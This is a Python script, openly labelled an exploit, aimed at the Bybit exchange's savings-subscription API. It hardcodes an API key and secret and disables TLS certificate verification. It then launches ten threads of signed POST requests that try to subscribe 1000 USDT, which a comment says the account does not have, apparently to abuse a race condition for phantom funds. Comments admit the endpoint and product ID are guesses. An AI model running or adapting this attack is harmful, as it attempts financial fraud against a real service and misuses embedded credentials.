#!/usr/bin/env python3
import urllib.request
import ssl
import time
import hmac
import hashlib
import json
import threading

print("EARN GHOST SUBSCRIPTION EXPLOIT")
print("===============================")

API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def get_offset():
    try:
        r = urllib.request.urlopen(BASE_URL + "/v5/market/time", context=ctx, timeout=3)
        d = json.loads(r.read())
        return int(d['result']['timeSecond'])*1000 - int(time.time()*1000)
    except:
        return 0

OFFSET = get_offset()
print(f"Offset: {OFFSET}ms")

def attack(i):
    # Endpoint for Flexible Savings Subscribe
    # Note: Actual endpoint might differ, checking common ones
    endpoint = "/v5/earn/order/create" 
    
    payload = {
        "category": "Flexible", # or correct product ID
        "coin": "USDT",
        "amount": "1000", # Amount we definitely don't have
        "productId": "USDT_FLEXIBLE" # Assumption
    }
    
    payload_str = json.dumps(payload)
    timestamp = str(int(time.time() * 1000) + OFFSET)
    recv_window = "5000"
    
    sign_payload = f"{timestamp}{API_KEY}{recv_window}{payload_str}"
    sig = hmac.new(bytes(API_SECRET, "utf-8"), bytes(sign_payload, "utf-8"), hashlib.sha256).hexdigest()
    
    req = urllib.request.Request(BASE_URL + endpoint, data=payload_str.encode(), method='POST')
    req.add_header("X-BAPI-API-KEY", API_KEY)
    req.add_header("X-BAPI-SIGN", sig)
    req.add_header("X-BAPI-SIGN-TYPE", "2")
    req.add_header("X-BAPI-TIMESTAMP", timestamp)
    req.add_header("X-BAPI-RECV-WINDOW", recv_window)
    req.add_header("Content-Type", "application/json")
    
    try:
        res = urllib.request.urlopen(req, context=ctx, timeout=5)
        print(f"[{i}] {res.read().decode()[:100]}")
    except Exception as e:
        # Just print simplified error
        err = str(e)
        if "HTTP Error" in err:
            try:
                print(f"[{i}] HTTP Error")
            except:
                pass
        else:
            print(f"[{i}] {err}")

print("Launching 10 threads...")
threads = []
for i in range(10):
    t = threading.Thread(target=attack, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
    
print("Attack complete.")
